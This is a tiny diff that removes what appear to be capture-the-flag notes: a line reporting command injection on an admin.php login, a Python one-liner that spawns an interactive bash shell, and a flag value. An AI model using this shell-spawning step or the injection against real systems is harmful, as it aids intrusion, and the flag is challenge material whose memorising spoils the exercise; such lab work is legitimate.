@@ -1,7 +1,0 @@
-
-CMD injection on login admin.php
-
-python -c 'import pty; pty.spawn("/bin/bash")'
-flag:d68815f2afbc48a2a717de2f35478600
-
-
